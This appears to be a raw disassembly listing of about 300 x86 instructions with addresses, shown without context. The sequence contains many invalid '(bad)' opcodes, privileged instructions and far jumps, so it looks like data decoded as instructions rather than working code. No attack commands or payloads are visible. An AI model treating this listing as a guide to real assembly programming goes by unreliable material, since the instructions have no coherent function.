  41509f:	idiv   DWORD PTR [eax-0x73]
  4150a2:	fimul  DWORD PTR [esi+0x13]
  4150a5:	cmc    
  4150a6:	aad    0xfe
  4150a8:	xor    al,BYTE PTR [esi+0x50]
  4150ab:	jl     0x41510e
  4150ad:	xchg   esi,eax
  4150ae:	test   bh,bl
  4150b0:	jmp    0x415058
  4150b2:	daa    
  4150b3:	push   ebx
  4150b4:	adc    DWORD PTR [edx-0x5651daa3],esi
  4150ba:	aad    0x21
  4150bc:	cmp    ebp,DWORD PTR [esi]
  4150be:	push   esp
  4150bf:	iret   
  4150c0:	mov    edx,0x8175660e
  4150c5:	jp     0x41505b
  4150c7:	call   0xe671:0x7cd6a137
  4150ce:	or     ch,BYTE PTR [esi+0x78]
  4150d1:	sti    
  4150d2:	mov    edi,0xe4200f7a
  4150d7:	mov    BYTE PTR [ecx+0x6a],dl
  4150da:	sahf   
  4150db:	mov    cl,0xe3
  4150dd:	xchg   ebp,eax
  4150de:	aad    0x7d
  4150e0:	or     ebp,DWORD PTR [ebx+ebp*1]
  4150e3:	lahf   
  4150e4:	push   eax
  4150e5:	and    eax,0xc510aefe
  4150ea:	mov    cs,WORD PTR [ecx+esi*8-0x1bfecbb2]
  4150f1:	mov    ds:0xe672726e,al
  4150f6:	mov    dl,0x45
  4150f8:	push   ecx
  4150f9:	(bad)  
  4150fa:	or     al,0x3d
  4150fc:	pop    ebp
  4150fd:	outs   dx,BYTE PTR ds:[esi]
  4150fe:	add    al,0x75
  415100:	mov    dh,0x7f
  415102:	repz push 0x810a2fb7
  415108:	adc    esi,DWORD PTR [esi-0x14f63aeb]
  41510e:	aad    0x69
  415110:	sbb    al,0x8c
  415112:	jo     0x4150a2
  415114:	or     edi,DWORD PTR [edi+0x2062e960]
  41511a:	(bad)  
  41511b:	lods   al,BYTE PTR ds:[esi]
  41511c:	push   edx
  41511d:	or     BYTE PTR [esi],dl
  41511f:	sub    BYTE PTR [ebx+0x7f],dh
  415122:	adc    bl,BYTE PTR [esi-0x48]
  415125:	and    BYTE PTR [edx+0x37a03140],dh
  41512b:	jno    0x415186
  41512d:	fwait
  41512e:	shr    BYTE PTR [ebp+0x31558464],1
  415134:	rol    BYTE PTR gs:[edx+0x38],1
  415138:	push   ecx
  415139:	lods   al,BYTE PTR ds:[esi]
  41513a:	aad    0xa5
  41513c:	push   esp
  41513d:	jns    0x4151a3
  41513f:	adc    BYTE PTR [eax-0x618a9575],bl
  415145:	fisubr WORD PTR [edi]
  415147:	jl     0x41510f
  415149:	ja     0x4151c3
  41514b:	and    al,0x71
  41514d:	push   ds
  41514e:	les    ebp,FWORD PTR [edi-0x78]
  415151:	adc    cl,BYTE PTR [esi+eiz*4+0x7e]
  415155:	pop    ds
  415156:	push   esp
  415157:	rcl    BYTE PTR [edx],0xb3
  41515a:	lds    edx,FWORD PTR [edx+0x42]
  41515d:	gs (bad) 
  41515f:	push   edx
  415160:	iret   
  415161:	inc    edx
  415162:	add    esi,DWORD PTR [eax+0xe]
  415165:	inc    esp
  415166:	add    eax,0x6457ebb1
  41516b:	and    al,0xf2
  41516d:	mov    ch,0xcf
  41516f:	test   eax,0xe4fa86c9
  415174:	push   es
  415175:	jo     0x41514c
  415177:	retf   
  415178:	scas   eax,DWORD PTR es:[edi]
  415179:	fild   DWORD PTR [ecx]
  41517b:	xchg   edx,eax
  41517c:	cmp    BYTE PTR [edi],cl
  41517e:	adc    BYTE PTR [ebp-0x9],dh
  415181:	out    0x6a,eax
  415183:	jl     0x41515c
  415185:	xlat   BYTE PTR ds:[ebx]
  415186:	and    al,BYTE PTR [edx-0x28d0ce80]
  41518c:	scas   al,BYTE PTR es:[edi]
  41518d:	jg     0x415185
  41518f:	out    0x66,eax
  415191:	mov    dh,0xfe
  415193:	je     0x415195
  415195:	leave  
  415196:	int    0xa3
  415198:	pushf  
  415199:	push   ecx
  41519a:	test   al,0xdf
  41519c:	imul   ebx,edi,0xffffffd5
  41519f:	mov    ?,WORD PTR [eax-0x44]
  4151a2:	push   0x966c0d6c
  4151a7:	jl     0x415131
  4151a9:	inc    esp
  4151aa:	or     al,0xcf
  4151ac:	mov    cl,0x22
  4151ae:	aam    0x26
  4151b0:	popa   
  4151b1:	jb     0x4151c5
  4151b3:	mov    eax,0xa3898d71
  4151b8:	xchg   DWORD PTR [ebp+0x201afb5e],eax
  4151be:	and    eax,0xf66ee151
  4151c3:	pop    ebp
  4151c4:	jmp    0x6b9b641f
  4151c9:	cs sub esp,esi
  4151cc:	in     al,0x7f
  4151ce:	cmp    eax,0x4a7545cd
  4151d3:	jl     0x41516f
  4151d5:	repnz xlat BYTE PTR ds:[ebx]
  4151d7:	std    
  4151d8:	push   ds
  4151d9:	add    BYTE PTR [ebp-0x41],bh
  4151dc:	push   esi
  4151dd:	adc    eax,0x86f584d6
  4151e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e3:	xchg   edi,eax
  4151e4:	pop    ecx
  4151e5:	jle    0x4151a7
  4151e7:	jne    0x415241
  4151e9:	fsubr  QWORD PTR [esi+0x66]
  4151ec:	xor    BYTE PTR [edi-0x12],bh
  4151ef:	into   
  4151f0:	jno    0x415259
  4151f2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151f4:	sbb    DWORD PTR [ebx+0x20],eax
  4151f7:	sbb    al,0xaa
  4151f9:	pop    ds
  4151fa:	hlt    
  4151fb:	adc    esi,esp
  4151fd:	mov    bh,0x35
  4151ff:	cld    
  415200:	mov    ch,0xc1
  415202:	fcom   QWORD PTR [ebp+ebp*2-0x51]
  415206:	mov    esp,edx
  415208:	mov    cl,0x43
  41520a:	lods   eax,DWORD PTR ds:[esi]
  41520b:	jmp    0x69e3:0xd6242042
  415212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415213:	inc    ebp
  415214:	test   BYTE PTR [edi+0x26d7fdd7],cl
  41521a:	push   edx
  41521b:	jo     0x4151e6
  41521d:	jg     0x415256
  41521f:	leave  
  415220:	jne    0x415237
  415222:	push   ss
  415223:	jne    0x415231
  415225:	push   eax
  415226:	dec    esp
  415227:	loope  0x41529f
  415229:	mov    ds:0x28716e88,al
  41522e:	je     0x415265
  415230:	sub    cl,BYTE PTR [edi]
  415232:	add    esi,ebp
  415234:	loopne 0x4151b6
  415236:	cmp    ecx,esi
  415238:	inc    ecx
  415239:	add    DWORD PTR [edx+0x4d],ecx
  41523c:	push   ecx
  41523d:	cld    
  41523e:	(bad)  
  41523f:	jbe    0x4151e0
  415241:	call   0x87b6ab5d
  415246:	adc    DWORD PTR [edi],ecx
  415248:	xor    DWORD PTR [esi],ebp
  41524a:	cmp    al,BYTE PTR [edi-0x4a]
  41524d:	xlat   BYTE PTR ds:[ebx]
  41524e:	inc    ebp
  41524f:	ja     0x4152b1
  415251:	xor    edx,eax
  415253:	pop    ss
  415254:	shl    BYTE PTR es:0xd56cbaae,cl
  41525b:	in     al,dx
  41525c:	pushf  
  41525d:	dec    eax
  41525e:	pop    esi
  41525f:	aaa    
  415260:	sbb    al,0xcf
  415262:	fdiv   QWORD PTR [edi+ebp*1+0x22]
  415266:	ja     0x41526a
  415268:	pop    ebp
  415269:	cmp    edx,DWORD PTR [esi]
  41526b:	push   esi
  41526c:	jno    0x4152e1
  41526e:	mov    ah,0xe9
  415270:	out    0xd,eax
  415272:	sub    dl,BYTE PTR es:[ebx+0x6f6d951f]
  415279:	pusha  
  41527a:	sbb    eax,0x48c3fe86
  41527f:	les    esi,FWORD PTR [ecx+0x6]
  415282:	js     0x41528f
  415284:	jae    0x41522b
  415286:	jno    0x4152a8
  415288:	lea    ebx,[edi]
  41528a:	jae    0x415220
  41528c:	cmp    BYTE PTR [edx],cl
  41528e:	xchg   ebp,eax
  41528f:	in     al,dx
  415290:	pop    ss
  415291:	push   ds
  415292:	(bad)  
  415293:	cmp    eax,0x85e1c3bd
  415298:	dec    ebx
  415299:	(bad)  
  41529a:	test   DWORD PTR [ebx+0x758d592c],0x969fed17
  4152a4:	mov    ecx,0x1792dd0b
  4152a9:	xchg   ecx,eax
  4152aa:	adc    DWORD PTR [edx-0x12d7ebaf],edi
  4152b0:	adc    BYTE PTR [edi],ch
  4152b2:	adc    al,0x36
  4152b4:	mov    ah,0x6e
  4152b6:	mov    esp,0xe6807071
  4152bb:	lea    edx,[eax+0x27]
  4152be:	push   ecx
  4152bf:	aaa    
  4152c0:	jno    0x415311
  4152c2:	add    ah,BYTE PTR [bp+di+0x3f20]
  4152c7:	call   0xab83:0x89802305
  4152ce:	out    dx,eax
  4152cf:	pop    esi
  4152d0:	clc    
  4152d1:	dec    edi
  4152d2:	pop    ecx
  4152d3:	push   ecx
  4152d4:	cmp    cl,BYTE PTR [esi-0x2b]
  4152d7:	mov    eax,0xe0ed107a
  4152dc:	pop    esp
  4152dd:	adc    BYTE PTR [ebp+esi*2+0x3f07ddd3],0xdb
  4152e5:	pop    esi
  4152e6:	mov    ch,cl
  4152e8:	jno    0x4152f9
  4152ea:	(bad)  
  4152eb:	outs   dx,BYTE PTR ds:[esi]
  4152ec:	push   esi
  4152ed:	xor    bh,BYTE PTR [edi-0x3fcde346]
  4152f3:	fsub   QWORD PTR [ebx-0x777eafe1]
  4152f9:	jmp    0x6d47:0x7872175b
  415300:	dec    ebp
  415301:	dec    ebp
  415302:	neg    BYTE PTR [edi]
  415304:	inc    ebp
  415305:	jge    0x415332
  415307:	jne    0x4152ae
  415309:	mov    esp,0xe2c4877d
  41530e:	ds stc 
  415310:	jno    0x4152d4
  415312:	sbb    eax,0xd212b5f1
  415317:	aaa    
  415318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415319:	popf   
  41531a:	test   BYTE PTR [ebp-0x77],dh
  41531d:	rcl    BYTE PTR [eax-0x60b7d6bd],1
  415323:	push   ecx
  415324:	xchg   ebp,edi
  415326:	dec    edx
  415327:	inc    edx
  415328:	jno    0x415368
  41532a:	das    
  41532b:	pop    ecx
  41532c:	jmp    0x2ab6485e
  415331:	bound  ecx,QWORD PTR [ebx-0x3c]
  415334:	adc    ecx,DWORD PTR [esi+edx*2-0x72]
  415338:	jno    0x4152bc
  41533a:	pop    esi
  41533b:	cmp    eax,DWORD PTR [ecx+0x1a]
  41533e:	push   edx
  41533f:	mov    esi,0x97d22010
  415344:	jnp    0x41531b
  415346:	les    ebx,FWORD PTR [ebx+0x17652bc0]
  41534c:	jb     0x4152d6
  41534e:	lds    esi,FWORD PTR [esp+edx*8-0x1e9e5dd6]
  415355:	test   al,0xf9
  415357:	ja     0x4153a3
  415359:	shl    BYTE PTR [ecx*1-0x7c7a7897],0xdc
  415361:	add    BYTE PTR [esi],bl
  415363:	mov    cl,0x32
  415365:	xchg   ebp,eax
  415366:	in     al,0x39
  415368:	dec    ebp
  415369:	(bad)  
  41536a:	icebp  
  41536b:	push   esp
  41536c:	jle    0x415323
  41536e:	jmp    0x8fbc:0x9201c38
  415375:	push   ss
  415376:	aam    0x76
  415378:	pop    esi
  415379:	loope  0x415350
  41537b:	lahf   
  41537c:	data16 jno 0x41532b
  41537f:	pop    esp
  415380:	sub    dh,BYTE PTR [ecx+eax*1]
  415383:	jne    0x41537d
  415385:	aad    0xcf
  415387:	(bad)  
  415388:	mov    bh,0x86
  41538a:	cmp    BYTE PTR [ebx],bh
  41538c:	jno    0x415321
  41538e:	mov    cl,0x3a
  415390:	inc    edx
  415391:	sbb    DWORD PTR [ebp-0x8dff2b3],esp
  415397:	xchg   ebp,eax
  415398:	or     ecx,DWORD PTR [esi-0x26]
  41539b:	inc    esp
  41539c:	push   ds
  41539d:	inc    ebp
  41539e:	aad    0x61
  4153a0:	push   ss
  4153a1:	fiadd  DWORD PTR [ecx+0x3f2d90c7]
  4153a7:	jne    0x415408
  4153a9:	sub    al,0x64
  4153ac:	call   ebp
  4153ae:	dec    eax
  4153af:	lahf   
  4153b0:	nop
  4153b1:	pop    ebp
  4153b2:	call   0x3180:0xc03ced6f
  4153b9:	jg     0x4153c6
  4153bb:	(bad)  
  4153bc:	push   eax
  4153bd:	cli    
  4153be:	cmc    
  4153bf:	ja     0x415414
  4153c1:	dec    esi
  4153c2:	mov    ecx,0x658a287b
  4153c7:	lahf   
  4153c8:	xchg   DWORD PTR [edi-0x498ef94b],eax
  4153ce:	stos   BYTE PTR es:[edi],al
  4153cf:	mov    DWORD PTR [eax+0x79],edx
  4153d2:	xchg   ecx,eax
  4153d3:	adc    DWORD PTR ss:[eax],esp
  4153d6:	adc    al,0x49
  4153d8:	lahf   
  4153d9:	push   ebx
  4153da:	push   edi
  4153db:	cmp    eax,0xde4cc103
  4153e0:	jno    0x415399
  4153e2:	mov    ebp,0x36a424fa
  4153e7:	add    al,0x66
  4153e9:	mov    eax,0x2e88754b
  4153ee:	cmp    BYTE PTR [ebx+0x3b],al
  4153f1:	outs   dx,BYTE PTR ds:[esi]
  4153f2:	out    dx,al
  4153f3:	hlt    
  4153f4:	jno    0x4153e2
  4153f6:	pop    eax
  4153f7:	mov    edx,0x60c163f3
  4153fc:	sbb    al,0x91
  4153fe:	or     bh,BYTE PTR [edi+eiz*1-0x3c]
  415402:	fbstp  TBYTE PTR [edi+esi*4]
  415405:	lahf   
  415406:	inc    edx
  415407:	dec    edx
  415408:	loope  0x41545b
  41540a:	aad    0x7a
  41540c:	dec    ebx
  41540d:	xor    dl,ah
  41540f:	jecxz  0x415464
  415411:	inc    edx
  415412:	xor    al,0x76
  415414:	gs cdq 
  415416:	add    DWORD PTR gs:[edx],ecx
  415419:	arpl   WORD PTR [ecx],sp
  41541b:	jae    0x41546e
  41541d:	xor    esi,esi
  41541f:	sbb    eax,0x8e495990
  415424:	icebp  
  415425:	jne    0x4153cc
  415427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415428:	loop   0x415458
  41542a:	mov    bl,BYTE PTR [ebp-0x4a]
  41542d:	pop    ds
  41542e:	stos   DWORD PTR es:[edi],eax
  41542f:	lock mov eax,ds:0x6d07fca4
  415435:	pop    ss
  415436:	(bad)  
  415437:	in     al,0xa9
  415439:	mov    al,ds:0x2dd12dc2
  41543e:	stos   BYTE PTR es:[edi],al
  41543f:	xchg   esp,eax
  415440:	ret    
  415441:	fcom   QWORD PTR [ebp+0x2f3d7db5]
  415447:	sbb    DWORD PTR [ebx+edi*8],edx
  41544a:	aad    0x93
  41544c:	mov    al,ds:0xf7c8f99e
  415451:	xchg   edi,eax
  415452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415453:	mov    dl,0xd9
  415455:	cmc    
  415456:	jecxz  0x41548d
  415458:	stc    
  415459:	push   cs
  41545a:	xchg   edi,eax
  41545b:	mov    esp,0x65b8f2ee
  415460:	fs cmp esp,esp
  415463:	push   cs
  415464:	out    0x16,al
  415466:	pop    edi
  415467:	xor    eax,0x6ddc8df0
  41546c:	add    DWORD PTR [eax],esp
  41546e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41546f:	es sub eax,0xd0999d69
  415475:	hlt    
  415476:	add    al,0x46
  415478:	lods   eax,DWORD PTR ds:[esi]
  415479:	ja     0x4153fc
  41547b:	jne    0x415474
  41547d:	xchg   ebp,eax
  41547e:	add    eax,0x4b80558
  415483:	fimul  DWORD PTR [ebp+0x34114371]
  415489:	imul   edi,DWORD PTR [ebx+0x70],0x23
  41548d:	test   al,0xce
  41548f:	sbb    al,0x0
	...
